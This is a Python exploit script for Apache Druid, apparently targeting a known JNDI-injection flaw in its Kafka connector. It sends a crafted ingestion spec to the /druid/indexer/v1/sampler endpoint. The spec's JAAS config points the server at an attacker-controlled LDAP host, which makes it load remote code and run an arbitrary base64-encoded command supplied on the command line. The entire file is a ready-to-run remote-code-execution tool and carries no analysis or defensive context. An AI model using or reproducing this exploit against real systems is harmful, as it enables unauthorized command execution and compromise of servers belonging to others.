# @Time    : 2023/5/5
# @Author  : jeyiuwai
# @File    : druid.py

import argparse
import base64

import requests
import json

def send_post_request(url, headers, data):
    # 发送 POST 请求
    response = requests.post(url, headers=headers, data=json.dumps(data))

    # 获取响应状态码和内容
    status_code = response.status_code
    content = response.content.decode('utf-8')

    # 判断响应是否成功
    if status_code == 500 or 'createChannelBuilde' in content:
        print('[+] Exploit Success ~')
    else:
        print('[-] Exploit maybe fail.')


def get_data(jndi_ip, cmd):
    # 设置请求体
    data = {
        "type": "kafka",
        "spec": {
            "type": "kafka",
            "ioConfig": {
                "type": "kafka",
                "consumerProperties": {
                    "bootstrap.servers": "127.0.0.1:6666",
                    "sasl.mechanism": "SCRAM-SHA-256",
                    "security.protocol": "SASL_SSL",
                    "sasl.jaas.config": f"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://{jndi_ip}:1389/Basic/Command/base64/{cmd}\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
                },
                "topic": "test",
                "useEarliestOffset": True,
                "inputFormat": {
                    "type": "regex",
                    "pattern": "([\\s\\S]*)",
                    "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
                    "columns": [
                        "raw"
                    ]
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "timestampSpec": {
                    "column": "!!!_no_such_column_!!!",
                    "missingValue": "1970-01-01T00:00:00Z"
                },
                "dimensionsSpec": {

                },
                "granularitySpec": {
                    "rollup": False
                }
            },
            "tuningConfig": {
                "type": "kafka"
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "timeoutMs": 15000
        }
    }
    # print(data)
    return data

def base64_encode(original_str):
    # 将字符串编码为 bytes 对象
    original_bytes = original_str.encode('utf-8')
    # 使用 base64 进行编码
    encoded_bytes = base64.b64encode(original_bytes)
    # 将编码后的 bytes 对象转换为字符串
    encoded_str = encoded_bytes.decode('utf-8')
    # 返回编码后的字符串
    return encoded_str

if __name__ == '__main__':
    # 解析命令行参数
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, required=True, help='target IP or hostname')
    parser.add_argument('-j', '--jndi-ip', type=str, required=True, help='jndi_ip')
    parser.add_argument('-c', '--cmd', type=str, required=True, help='command to execute')
    args = parser.parse_args()

    # 构造 URL
    url = f"http://{args.target}:8888/druid/indexer/v1/sampler"
    print("[+] URL:" + url)
    print("[+] Target IP:" + args.target)
    print("[+] JNDI IP:" + args.jndi_ip)
    print("[+] Command:" + args.cmd)

    # 设置请求头
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/json"
    }

    # 获取请求体
    data = get_data(args.jndi_ip, base64_encode(args.cmd))

    # 调用函数发送 POST 请求
    send_post_request(url, headers, data)
